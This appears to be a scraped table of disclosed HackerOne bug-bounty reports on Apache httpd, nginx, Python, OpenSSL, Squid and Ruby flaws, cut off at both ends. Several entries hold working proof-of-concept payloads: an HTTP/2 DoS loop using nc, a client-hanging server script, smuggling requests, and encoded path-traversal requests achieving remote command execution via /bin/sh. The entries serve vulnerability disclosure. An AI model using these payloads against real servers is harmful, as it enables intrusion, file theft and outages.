CharlesInternet Bug Bounty  rewarded real with a $1,500 bounty. Sep 10th (3 years ago)reed   closed the report and changed the status to Resolved. Sep 10th (3 years ago)Thank you for helping keep the Internet safer!reed   requested to disclose this report. Sep 10th (3 years ago)real   agreed to disclose this report. Sep 11th (3 years ago)  This report has been disclosed. Sep 11th (3 years ago)real   posted a comment. Sep 11th (3 years ago)Thank you !",https://hackerone.com/reports/520903,No value,No value,No value,2019,4,2,15,17
Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,5.3,Denial of Service,DoS for HTTP/2 connections by crafted requests (CVE-2018-1333),"cy1337  submitted a report to Internet Bug Bounty.Jul 21st (4 years ago)mod_http2 can be tricked by specially crafted requests to hold server resources longer than necessary.
A simple demonstration of this for a server with h2c enabled is as follows:
for x in seq 0 500; do echo 505249202a20485454502f322e300d0a0d0a534d0d0a0d0a00001204000000000000000000006400044000000000020000000000001b0104000000018284864187089d5c0b8178ff7a8825b650c3abb6f2e053032a2f2a00001b0105000000019a84864187089d5c0b8178ff7a880000000000000000 | xxd -r -p | nc hostname port 2>&1 >/dev/null & done
Impact
Certain crafted HTTP2 requests identified with afl-fuzz can cause Apache worker threads to stay open waiting for data until a timeout. A typical configuration has a 1 minute timeout with 150 request workers. This means an attacker can effectively make the service unresponsive to legitimate users with a slow rate (3-4 requests/second) of short crafted requests.",https://hackerone.com/reports/384839,No value,No value,No value,2018,7,21,2,41
Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",Medium,4.0,HTTP Request Smuggling,Apache HTTP Request Parsing Whitespace Defects,regilero  submitted a report to Internet Bug Bounty.Jun 29th (5 years ago),https://hackerone.com/reports/244459,No value,No value,No value,2017,6,29,17,41
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,mod_lua: Crash in websockets PING handling,"guido  submitted a report to Internet Bug Bounty.Jan 28th (8 years ago)A stack recursion crash in the mod_lua module was found. A Lua script executing the r:wsupgrade() function could crash the process if a malicious client sent a carefully crafted PING request. This issue affected releases 2.4.7 through 2.4.12 inclusive.
https://httpd.apache.org/security/vulnerabilities_24.html",https://hackerone.com/reports/103991,No value,No value,No value,2015,1,28,0,0
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,mod_proxy_fcgi buffer overflow,"talko  submitted a report to Internet Bug Bounty.Sep 17th (8 years ago)This issue was reported directly to the Apache team.
A buffer overflow was found in mod_proxy_fcgi. A malicious FastCGI server could send a carefully crafted response which could lead to a heap buffer overflow.
http://httpd.apache.org/security/vulnerabilities_24.html#2.4.11-devInternet Bug Bounty  rewarded talko with a $500 bounty. Nov 17th (8 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/36264,No value,No value,No value,2014,9,17,0,0
Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,5.45,CRLF Injection,mod_userdir CRLF injection (CVE-2016-4975),"bobrov  submitted a report to Internet Bug Bounty.Sep 13th (4 years ago)Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the ""Location"" or other outbound header key or value.
Reported to security team	24th July 2016
Issue public	14th August 2018
Update Released	20th December 2016
Affects	2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1
https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2016-4975
https://httpd.apache.org/security/vulnerabilities_22.html#CVE-2016-4975
Impact
CRLF Injection",https://hackerone.com/reports/409512,No value,No value,No value,2018,9,13,22,13
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,moderate: mod_deflate denial of service,"gianko  submitted a report to Internet Bug Bounty.Feb 19th (9 years ago)A resource consumption flaw was found in mod_deflate. If request body decompression was configured (using the ""DEFLATE"" input filter), a remote attacker could cause the server to consume significant memory and/or CPU resources. The use of request body decompression is not a common configuration.
Acknowledgements: This issue was reported by Giancarlo Pellegrino and Davide Balzarotti
Resolved in Apache httpd 2.4.10-dev: http://httpd.apache.org/security/vulnerabilities_24.htmlInternet Bug Bounty  rewarded gianko with a $500 bounty. Jul 20th (8 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/20861,No value,No value,No value,2014,2,19,0,0
Internet Bug Bounty,1-10,1.0,No value,$100.00,Low,2.0,Use After Free,Optionsbleed / CVE-2017-9798,"hanno  submitted a report to Internet Bug Bounty.Sep 19th (5 years ago)Bug has been disclosed here:
https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html
poc code:
https://github.com/hannob/optionsbleed
Apache is currently preparing 2.4.28, which will contain the fix, a patch is available in their svn repo.",https://hackerone.com/reports/269568,No value,No value,No value,2017,9,19,18,4
Internet Bug Bounty,1-10,1.0,No value,$100.00,Low,3.7,Information Disclosure,Use of uninitialized value in ftp_getrc_msg method of mod_proxy_ftp.c,"chamal  submitted a report to Internet Bug Bounty.Apr 4th (3 years ago)This is a Security Bug Report for mod_proxy_ftp. This bug is present in ftp_getrc_msg method of modules/proxy/mod_proxy_ftp.c file.
This is the line which causes this bug.
Code 54 BytesWrap lines Copy Download1...
2  mb = apr_cpystrn(mb, response + 4, me - mb);
3...
If ftp server returns a response like ""\r\n"", which has 3 characters with terminating NULL byte, apr_cpystrn method will copy uninitialized values.
Because that line uses ""response + 4"" as the source of data for apr_cpystrn method.
Apache Http Server version: 2.4.41
CVE-ID: CVE-2020-1934
Apache Http server fixed security bugs: (https://httpd.apache.org/security/vulnerabilities_24.html)
Steps to reproduce
Python 3 and Ubuntu OS 18.04 are required.

Download attached ftpserver.py file.
Enable proxy_module and proxy_ftp_module on Apache Http server.
Add these lines to httpd.conf file of Apache http server.

Code 112 BytesWrap lines Copy Download1   ProxyRequests On
2
3   <Proxy *>
4     Order deny,allow
5     Deny from all
6     Allow from 127.0.0.1
7   </Proxy>

Enter proxy settings

Open Setting on your Ubuntu OS.
Select Network
Click settings icon next to ""Network Proxy"" option.
Tick ""Manual"" option.
Enter Apache servers IP and port next to ""FTP Proxy""


Run Apache http server with Valgrind.
 sudo valgrind --leak-check=yes bin/httpd -X
Run attached ftpserver.py
sudo python3 ftpserver.py

This python program will start a server on port 21.


Open a new terminal window and run this command.
curl ftp://127.0.0.1

Valgrind Output
Memcheck, a memory error detector
Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
Using Valgrind-3.13.0 and LibVEX; rerun with -h for copyright info
Command: bin/httpd -X
Thread 4:
Conditional jump or move depends on uninitialised value(s)
at 0x52E6FFE: apr_cpystrn (in /usr/lib/x86_64-linux-gnu/libapr-1.so.0.6.3)
by 0x8A0A46A: ftp_getrc_msg (mod_proxy_ftp.c:403)
by 0x8A0C6CF: proxy_ftp_command (mod_proxy_ftp.c:828)
by 0x8A0EAF1: proxy_ftp_handler (mod_proxy_ftp.c:1212)
by 0x87F0259: proxy_run_scheme_handler (mod_proxy.c:3082)
by 0x87E9F08: proxy_handler (mod_proxy.c:1251)
by 0x17462C: ap_run_handler (config.c:170)
by 0x17516E: ap_invoke_handler (config.c:444)
by 0x195E74: ap_process_async_request (http_request.c:453)
by 0x1915BD: ap_process_http_async_connection (http_core.c:158)
by 0x1917EB: ap_process_http_connection (http_core.c:252)
by 0x183D4A: ap_run_process_connection (connection.c:42)
Conditional jump or move depends on uninitialised value(s)
at 0x52E700F: apr_cpystrn (in /usr/lib/x86_64-linux-gnu/libapr-1.so.0.6.3)
by 0x8A0A46A: ftp_getrc_msg (mod_proxy_ftp.c:403)
by 0x8A0C6CF: proxy_ftp_command (mod_proxy_ftp.c:828)
by 0x8A0EAF1: proxy_ftp_handler (mod_proxy_ftp.c:1212)
by 0x87F0259: proxy_run_scheme_handler (mod_proxy.c:3082)
by 0x87E9F08: proxy_handler (mod_proxy.c:1251)
by 0x17462C: ap_run_handler (config.c:170)
by 0x17516E: ap_invoke_handler (config.c:444)
by 0x195E74: ap_process_async_request (http_request.c:453)
by 0x1915BD: ap_process_http_async_connection (http_core.c:158)
by 0x1917EB: ap_process_http_connection (http_core.c:252)
by 0x183D4A: ap_run_process_connection (connection.c:42)
Conditional jump or move depends on uninitialised value(s)
at 0x8A0A475: ftp_getrc_msg (mod_proxy_ftp.c:405)
by 0x8A0C6CF: proxy_ftp_command (mod_proxy_ftp.c:828)
by 0x8A0EAF1: proxy_ftp_handler (mod_proxy_ftp.c:1212)
by 0x87F0259: proxy_run_scheme_handler (mod_proxy.c:3082)
by 0x87E9F08: proxy_handler (mod_proxy.c:1251)
by 0x17462C: ap_run_handler (config.c:170)
by 0x17516E: ap_invoke_handler (config.c:444)
by 0x195E74: ap_process_async_request (http_request.c:453)
by 0x1915BD: ap_process_http_async_connection (http_core.c:158)
by 0x1917EB: ap_process_http_connection (http_core.c:252)
by 0x183D4A: ap_run_process_connection (connection.c:42)
by 0x1A189C: process_socket (event.c:1050)
...

Complete valgrind output is attached.

Impact
Uninitialized data may leak data from memory.2 attachments:F772992: ftpserver.pyF773003: valgring_output.txt",https://hackerone.com/reports/838685,No value,No value,No value,2020,4,4,7,29
Internet Bug Bounty,1-10,1.0,No value,$240.00,Low,2.0,None,"""urllib"" will result to deny of service","leveryd  submitted a report to Internet Bug Bounty.May 7th (2 years ago)if a client request a http/https/ftp service which is controlled by attacker, attacker can make this client hang forever, event client has set ""timeout"" argument.
maybe this client also will consume more and more memory. i does not test on this conclusion.
client.py
Code 126 BytesWrap lines Copy Download1import urllib.request
2
3req = urllib.request.Request('http://127.0.0.1:8085')
4response = urllib.request.urlopen(req, timeout=1)
evil_server.py
Code 1.03 KiBWrap lines Copy Download1# coding:utf-8
2from socket import *
3from multiprocessing import *
4from time import sleep
5
6def dealWithClient(newSocket,destAddr):
7    recvData = newSocket.recv(1024)
8    newSocket.send(b""""""HTTP/1.1 100 OK\n"""""")
9
10    while True:
11        # recvData = newSocket.recv(1024)
12        newSocket.send(b""""""x:a\n"""""")
13
14        if len(recvData)>0:
15            # print('recv[%s]:%s'%(str(destAddr), recvData))
16            pass
17        else:
18            print('[%s]close'%str(destAddr))
19            sleep(10)
20            print('over')
21            break
22
23    # newSocket.close()
24
25
26def main():
27
28    serSocket = socket(AF_INET, SOCK_STREAM)
29    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)
30    localAddr = ('', 8085)
31    serSocket.bind(localAddr)
32    serSocket.listen(5)
33
34    try:
35        while True:
36            newSocket,destAddr = serSocket.accept()
37
38            client = Process(target=dealWithClient, args=(newSocket,destAddr))
39            client.start()
40
41            newSocket.close()
42    finally:
43        serSocket.close()
44
45if __name__ == '__main__':
46    main()
Impact
if a client request a http/https/ftp service which is controlled by attacker, attacker can make this client hang forever, event client has set ""timeout"" argument.
more info, see https://bugs.python.org/issue44022",https://hackerone.com/reports/1188128,No value,No value,No value,2021,5,7,17,14
Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,5.45,Off-by-one Error,1-byte heap buffer overflow in DNS resolver,"luismerino  submitted a report to Internet Bug Bounty.May 27th (about 1 year ago)Official announcement: http://mailman.nginx.org/pipermail/nginx-announce/2021/000300.html
A security issue in nginx resolver was identified, which might allow an
attacker to cause 1-byte memory overwrite by using a specially crafted
DNS response, resulting in worker process crash or, potentially, in
arbitrary code execution (CVE-2021-23017).
The issue only affects nginx if the ""resolver"" directive is used in
the configuration file.  Further, the attack is only possible if an
attacker is able to forge UDP packets from the DNS server.
The issue affects nginx 0.6.18 - 1.20.0.
The issue is fixed in nginx 1.21.0, 1.20.1.
Patch for the issue can be found here:
http://nginx.org/download/patch.2021.resolver.txt
Thanks to Luis Merino, Markus Vervier, Eric Sesterhenn, X41 D-Sec GmbH.
Impact
Crash or, potentially,  arbitrary code execution.luismerino   posted a comment. May 28th (about 1 year ago)Official severity can be found here: http://nginx.org/en/security_advisories.htmlh1_analyst_layla HackerOne triage  posted a comment. May 29th (about 1 year ago)Hi @luismerino,
Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Have a great day! 
Kind regards,
@bassguitarluismerino   posted a comment. Jul 16th (about 1 year ago)Hello, any progress here? thxkunderkoffler HackerOne staff  updated CVE reference to CVE-2021-23017. Jul 28th (about 1 year ago)Internet Bug Bounty  rewarded luismerino with a $500 bounty. Jul 28th (about 1 year ago)Hi @luismerino,
Thank you for your contribution to making the internet safer!
Happy hacking!
kunderkoffler HackerOne staff  closed the report and changed the status to Resolved. Jul 28th (about 1 year ago)kunderkoffler HackerOne staff  requested to disclose this report. Jul 28th (about 1 year ago)  This report has been disclosed. Aug 27th (about 1 year ago)",https://hackerone.com/reports/1210450,No value,No value,No value,2021,5,27,10,32
Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",High,7.95,Classic Buffer Overflow,Buffer overflow in PyCArg_repr in _ctypes/callproc.c for Python 3.x to 3.9.1,"jordyzomer  submitted a report to Internet Bug Bounty.Jan 22nd (2 years ago)TL;DR Description
Python 3.x through 3.9.1 has a buffer overflow in PyCArg_repr in _ctypes/callproc.c, which may lead to remote code execution in certain Python applications that accept floating-point numbers as untrusted input, as demonstrated by a 1e300 argument to c_double.from_param. This occurs because sprintf is used unsafely. The CVE number used for this vulnerability is CVE-2021-3177.
Details
There's a buffer overflow in the PyCArg_repr() function in _ctypes/callproc.c.
The buffer overflow happens due to not checking the length of th sprintf() function on line: 
    case 'd':
sprintf(buffer, ""<cparam '%c' (%f)>"",
self->tag, self->value.d);
break;
Because we control self->value.d we could make it copy extreme values. For example we could make it copy 1e300 which would be a 1 with 300 zero's  to overflow the buffer.
This could potentially cause RCE when a user allows untrusted input in these functions.
Proof of Concept



from ctypes import *
c_double.from_param(1e300)
 buffer overflow detected : terminated
Aborted



References
    MISC:https://bugs.python.org/issue42938
MISC:https://github.com/python/cpython/pull/24239
MISC:https://python-security.readthedocs.io/vuln/ctypes-buffer-overflow-pycarg_repr.html
Impact
Availability
Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
Access Control
Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program’s implicit security policy.
Other
 When the consequence is arbitrary code execution, this can often be used to subvert any other security service.",https://hackerone.com/reports/1084342,No value,No value,No value,2021,1,22,9,48
Internet Bug Bounty,1-10,1.0,No value,"$2,000.00",High,7.95,Classic Buffer Overflow,CVE-2021-3711: SM2 decrypt  buffer overflow,"ouyang  submitted a report to Internet Bug Bounty.Sep 27th (about 1 year ago)CVE-2021-3711
In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the ""out"" parameter can be NULL and, on exit, the ""outlen"" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the ""out"" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. 
Reproduce step:
Examples of data that triggered the vulnerability

SM2 ciphertext data
Examples of ciphertext data are as follows:

3072022070DAD60CDA7C30D64CF4F278A849003581223F5324BFEC9BB329229BFFAD21A6021F18AFAB2B35459D2643243B242BE4EA80C6FA5071D2D847340CC57EB9309E5D04200B772E4DB664B2601E3B85E39E4DB664B2601E3B85E39C4AA308BE13588C301308E3588C01308E3588E3308E4

Parse SM2 ciphertext
The length of this ciphertext is 116 bytes. Parse this group of ciphertexts according to the ASN.1 format:

3072 //30 indicates the SEQUENCE type, 72 indicates that the total length of the subsequent data is 114 bytes
0220 //02 means INTEGER type, 20 means the length of the integer is 32 bytes
70DAD60CDA7C30D64CF4F278A849003581223F5324BFEC9BB329229BFFAD21A6 //32-byte XCoordinate
021F //02 means INTEGER type, 1F means the length of the integer is 31 bytes
18AFAB2B35459D2643243B242BE4EA80C6FA5071D2D847340CC57EB9309E5D //31-byte YCoordinate
0420 //04 means OCTETSTRING type, 20 means the length of the string is 32 bytes
0B772E4DB664B2601E3B85E39C4AA8C2C1910308BE13B331E009C5A9258C29FD //32-byte HASH
040B //04 means OCTETSTRING type, 0B means the length of the string is 11 bytes
6D588BE9260A94DA18E0E6 //11-byte ciphertext
After verification, the above-mentioned XCoordinate and YCoordinate satisfy the SM2 elliptic curve equation.

Trigger heap overflow
When pkey_sm2_decrypt is called for the first time, the pointer out is NULL and msg_len is equal to 116. The sm2_plaintext_size function returns 10 (msg_len-overhead = 116-106).

10 bytes of memory are allocated through OPENSSL_malloc, and out points to this memory.
The second call to pkey_sm2_decrypt, since the ciphertext has 11 bytes, the decryption result is also 11 bytes.
The memory pointed to by out is 10 bytes, and the decrypted result is 11 bytes, resulting in 1 byte being written out of bounds.
Impact
A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. 
OpenSSL versions 1.1.1k and below are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1l.
OpenSSL 1.0.2 is not impacted by this issue.
OpenSSL 3.0 alpha/beta releases are also affected but this issue will be addressed before the final release.",https://hackerone.com/reports/1352429,No value,No value,No value,2021,9,27,13,47
Internet Bug Bounty,1-10,1.0,No value,"$18,000.00",Critical,9.6,HTTP Response Splitting,HTTP Smuggling multiple issues in Squid 3.x & squid 4.x,"regilero  submitted a report to Internet Bug Bounty.Dec 14th (3 years ago)Hello, as can be seen on a recent public security update by Squid I reported several smuggling issues.
If you want some background on impact of Smuggling issues You can check the current works of James Keetle or my own previous published works.

https://www.youtube.com/watch?v=upEMlJeU_Ik  HTTP Desync Attacks: Smashing Into The Cell Next Door - James Kettle
https://www.youtube.com/watch?v=dVU9i5PsMPY  DEF CON 24 - regilero - Hiding Wookiees in HTTP: HTTP smuggling

But I'm quite sure that the recent additions of Smuggling tools in Burp suite is making Smuggling impacts issues more easy to understand now.
CVE-2019-18678

http://www.squid-cache.org/Advisories/SQUID-2019_10.txt

current score (5 / 5.3) available at :

https://www.suse.com/fr-fr/security/cve/CVE-2019-18678/



Advisory ID:        SQUID-2019:10
Date:               November 05, 2019
Summary:            HTTP Request Splitting issue
in HTTP message processing.
Affected versions:  Squid 3.0 -> 3.5.28
Squid 4.x -> 4.8
Fixed in version:   Squid 4.9
---------------------------->
http://www.squid-cache.org/Advisories/SQUID-2019_10.txt
(...)
Credits:
 This vulnerability was discovered by by Régis Leroy (regilero
from Makina Corpus).
Fixed by Amos Jeffries of Treehouse Networks Ltd.
Revision history:
 2019-07-24 11:52:51 UTC Initial Report
2019-09-11 02:52:52 UTC Patches Released
2019-11-04 13:43:22 UTC CVE Assignment

I can give more details than what is publicly available.
On the initial report from 2019-07-24 there were 4 issues. Only 1 of these issues is currently covered by the CVE-2019-18678.
Issue 1 : undisclosed Squid 3 issue
There is also an undisclosed Security filter bypass for Squid 3.x. This is a wonfix for Squid because Squid 3.x is not maintained anymore.
Without complete details this is an abuse of separators characters which allows access to urls where a security filter in Squid is present to prevent such locations from being accessed.
Project maintainer response:

Please be aware that Squid-3 has been deprecated for several years now.
Several of the problems you are pointing out are well-known issues with
the HTTP protocol design from RFC2616 itself not being clear. Squid-3
primarily implements that specification, with only sprinkling of RFC7230.
Squid-4 increases the upgrade to RFC7230 specification with
implementation of the majority of message parsing updates. Though that
is still an ongoing work.
(...)
As do Squid-4 releases. The fix is to upgrade the proxy to a version
where the problem has been fixed.

Issue 2 : HTTP Response Splitting issue on bad withespaces before header's colon
Squid allowed bad withespaces characters between the header title and the colon (before value).
This is forbidden in RFC 7230.

3.2.  Header Fields
Each header field consists of a case-insensitive field name followed
by a colon ("":""), optional leading whitespace, the field value, and
optional trailing whitespace.
header-field   = field-name "":"" OWS field-value OWS
field-name     = token
(...)
3.2.4.  Field Parsing
(...)
No whitespace is allowed between the header field-name and colon.  In
the past, differences in the handling of such whitespace have led to
security vulnerabilities in request routing and response handling.  A
server MUST reject any received request message that contains
whitespace between a header field-name and colon with a response code
of 400 (Bad Request).  A proxy MUST remove any such whitespace from a
response message before forwarding the message downstream.

This could be used to perform HTTP Smuggling attacks (if you want more details on exploitations I can add some very detailled examples, I'll just give you a short version).
Various invalid syntax where a space or pseudo space is added before ':' in the header line could be used against Squid to obtain an HTTP Response splitting attack:

Transfer-Encoding : chunked\r\n
Transfer-Encoding\t: chunked\r\n
Transfer-Encoding\f: chunked\r\n
Transfer-Encoding\f: chunked\r\n
Transfer-Encoding\r: chunked\r\n
Transfer-Encoding\x0b: chunked\r\n
Transfer-Encoding\t\x0b \r\f: chunked\r\n

Squid would give 3 response for this request (it should see only 2 requests, one from 01 to 12, and one from 13 to 15, but Squid saw one from 01 to 08, one from 09 to 12 and one from 14 to 15):
01 POST /?t=41 HTTP/1.1\r\n
02 Host: dummy-host.example.com\r\n
03 X-REQUEST-IDENTIFIER: 41\r\n
04 Content-Length: 92\r\n
05 Transfer-Encoding\x0b: chunked\r\n
06 \r\n
07 0\r\n
08 \r\n
09 GET /foo.html?t=42 HTTP/1.1\r\n
10 Host: dummy-host.example.com\r\n
11 X-REQUEST-IDENTIFIER: 42\r\n
12 \r\n
13 GET /bar.html?t=43 HTTP/1.1\r\n
14 Host: dummy-host.example.com\r\n
15 X-REQUEST-IDENTIFIER: 43\r\n
15 \r\n
Impacts are quite high, like HTTP Cache poisoning for any actor set in front of Squid, and security filter bypass for this previous actor also. Adding extra responses from the Squid stream is definitively a good way for adding choas on the HTTP chain (Dos, Xss, etc).
Issue 3 : Undisclosed SeverSide Request Forgery issue
This one is only fixed on master. The fix is not present on any published version of Squid. So we may talk about it later.
Issue 4 : Undisclosed HTTP Request Splitting
This one is still present and not yet fixed. So we may talk about it later, because I think it will be fixed one day.
I'm pretty sure this issue will soon be discovered by other bounty hunters. So I don't know if I should already give more details to claim precedence, currently I'll keep the details undisclosed and let the project maintainers act on that.
Summary
Issue #2 is the one covered by the published CVE.
For issues #3 & #4 I'm pretty sure that I will make reports later.
For issue #1 I'm not sure this can be covered by this program, I could give you more details if you want.
Impact
Like most HTTP Smuggling issue impact is not always directly targeted on Squid, here (if we only talk about issue #2) the impact is very important for HTTP actors set in front of squid (like an SSL terminator).
Cache poisoning,  DOS, XSS, etc.",https://hackerone.com/reports/758445,No value,No value,No value,2019,12,14,11,11
Internet Bug Bounty,1-10,1.0,No value,"$4,000.00",Critical,9.5,Path Traversal,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49,"monkey_logic  submitted a report to Internet Bug Bounty.Nov 8th (about 1 year ago)A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration ""require all denied"", these requests can succeed. If CGI scripts are also enabled for these aliased paths, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013.
Impact
The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.",https://hackerone.com/reports/1394916,No value,No value,No value,2021,11,8,21,47
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Critical,9.5,Path Traversal,Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773) (CVE-2021-42013),"fms  submitted a report to Internet Bug Bounty.Nov 14th (about 1 year ago)It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.
This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

My friend Juan Escobar @itsecurityco and me (Fernando Munoz) reported this internally to Apache HTTPd project and worked with them to test the new patch before the new version was released.

Impact
If files outside of these directories are not protected by the usual default configuration ""require all denied"", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.",https://hackerone.com/reports/1400238,No value,No value,No value,2021,11,14,23,54
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Critical,9.5,Path Traversal: '.../...//',Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50,"itsecurityco  submitted a report to Internet Bug Bounty.Nov 18th (about 1 year ago)Hello Apache team,
@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.
These are the payloads:
1) %%32%65%%32%65
2) .%%32%65
3) .%%32e
4) .%2%65
PoC Path Traversal
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
sec-ch-ua: "";Not A Brand"";v=""99"", ""Chromium"";v=""94""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Windows""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
PoC RCE
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
If-None-Match: ""2aa6-5cda88e8a6005-gzip""
If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
Connection: close
Content-Length: 60
echo Content-Type: text/plain; echo; id; uname;apache2ctl -M
Impact
An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.
If files outside of these directories are not protected by the usual default configuration ""require all denied"", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.2 attachments:F1518791: POC_RCE.pngF1518792: POC_Path_Traversal.png",https://hackerone.com/reports/1404731,No value,No value,No value,2021,11,18,21,56
Internet Bug Bounty,1-10,1.0,No value,"$1,200.00",Medium,5.45,None,Request line injection via HTTP/2 in Apache mod_proxy,"albinowax  submitted a report to Internet Bug Bounty.Nov 4th (about 1 year ago)I've written this issue up fully here: https://portswigger.net/research/http2#request
In case it's useful, here's the original report as sent to Apache:

I'd like to report a vulnerability in Apache mod_proxy when used with HTTP/2 enabled. 
It fails to reject HTTP requests that contain spaces in the :method HTTP/2 pseudo-header. This leads to a request-line injection vulnerability when it downgrades the requests to HTTP/1.1 and routes them on to the backend.
Attacker HTTP/2 request:
Code 93 BytesWrap lines Copy Download1:method: GET /anything HTTP/1.1
2:path: /
3:authority: psres.net
4Accept-Encoding: gzip, deflate
Resulting request forwarded to the backend by mod_proxy:
Code 83 BytesWrap lines Copy Download1GET /anything HTTP/1.1 / HTTP/1.1
2Host:: psres.net
3Accept-Encoding: gzip, deflate  
Provided the back-end server tolerates trailing junk in request lines, this enables attackers to bypass front-end security rules, poison web caches, and > change the protocol to HTTP/0.9 or 1.0, potentially enabling further attacks. I have identified some vulnerable systems in the wild.

Please let me know if you'd like any additional information
Impact
This lets attackers bypass front-end security rules like block-rules and escape subfolders. In some cases it may enable further attacks via protocol-downgrades and cache poisoning.Internet Bug Bounty  rewarded albinowax with a $1,200 bounty. Nov 4th (about 1 year ago)Thank you for your contribution to making the Internet safer!
This bounty was awarded with a 80/20% split. An additional $300 will be paid to the project.kunderkoffler HackerOne staff  updated CVE reference to CVE-2021-33193. Nov 4th (about 1 year ago)kunderkoffler HackerOne staff  closed the report and changed the status to Resolved. Nov 4th (about 1 year ago)kunderkoffler HackerOne staff  requested to disclose this report. Nov 4th (about 1 year ago)kunderkoffler HackerOne staff  disclosed this report. Nov 4th (about 1 year ago)",https://hackerone.com/reports/1391549,No value,No value,No value,2021,11,4,13,39
Internet Bug Bounty,1-10,1.0,No value,"$1,200.00",Medium,5.45,Denial of Service,Ruby - Regular Expression Denial of Service Vulnerability of Date Parsing Methods,"svalkanov  submitted a report to Internet Bug Bounty.Nov 19th (about 1 year ago)Official report:
https://www.ruby-lang.org/en/news/2021/11/15/date-parsing-method-regexp-dos-cve-2021-41817/
CVE-2021-41817
Here are the details from the official article:

Date’s parsing methods including Date.parse are using Regexps internally, some of which are vulnerable against regular expression denial of service. Applications and libraries that apply such methods to untrusted input may be affected.
The fix limits the input length up to 128 bytes by default instead of changing the regexps. This is because Date gem uses many Regexps and it is possible that there are still undiscovered vulnerable Regexps. For compatibility, it is allowed to remove the limitation by explicitly passing limit keywords as nil like Date.parse(str, limit: nil), but note that it may take a long time to parse.
Please update the date gem to version 3.2.1, 3.1.2, 3.0.2, and 2.0.1, or later. You can use gem update date to update it. If you are using bundler, please add gem ""date"", "">= 3.2.1"" to your Gemfile.

Please let me know if any additional information is needed
Impact
